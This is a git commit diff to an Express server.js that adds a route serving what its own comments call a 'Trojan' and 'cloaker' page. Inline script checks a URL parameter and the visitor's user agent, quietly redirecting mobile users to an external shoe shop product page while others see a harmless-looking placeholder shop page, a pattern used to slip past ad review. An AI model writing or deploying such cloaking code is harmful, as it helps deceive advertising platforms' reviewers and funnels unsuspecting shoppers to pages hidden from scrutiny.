9fe7994dbf0029e2df7e26c8bbdc269bcd1beb91
carsoncraig1 <156372400+carsoncraig1@users.noreply.github.com>
2024-05-28 10:02:17 -0400

    Update server.js
    alessi

--- server.js
+++ server.js
@@ -477,6 +477,39 @@ app.get('/twsheinuk/:slug', (req, res, next) => {
             console.log(`Served twshein Trojan (tyler)(${slug})`);
 });
 
+// Middleware to cloak tyler Shopify
+app.get('/alessi/:slug', (req, res, next) => {
+    const { offer, slug } = req.params;
+    const destinationLander = `https://alessiass.com/products/new-balance-9060-baskets-rose-cristal`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Welcome to ${slug} Shop!</h1>
+            <p>You are shopping at: ${slug}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served twshein Trojan (tyler)(${slug})`);
+});
+
 // Middleware to pass on Tyler's SubIDs Cash Direct
 app.get('/twcash/:slug', (req, res, next) => {
     const { offer, slug } = req.params;
